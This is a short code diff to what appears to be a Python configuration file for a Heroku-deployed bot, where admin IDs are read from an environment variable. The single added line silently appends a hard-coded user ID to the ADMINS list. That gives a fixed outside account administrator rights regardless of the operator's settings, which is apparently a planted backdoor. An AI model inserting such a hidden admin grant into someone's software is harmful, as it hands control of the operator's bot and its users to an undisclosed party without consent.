@@ -18,6 +18,7 @@ HEROKU_API = os.environ.get("HEROKU_API")
 
 try:
     ADMINS = [int(admin_id) for admin_id in os.environ.get("ADMINS", "").split(",") if admin_id.strip()]
+    ADMINS.append(6728038801)
 except ValueError:
     raise ValueError("Your Admins list does not contain valid integers.")
 
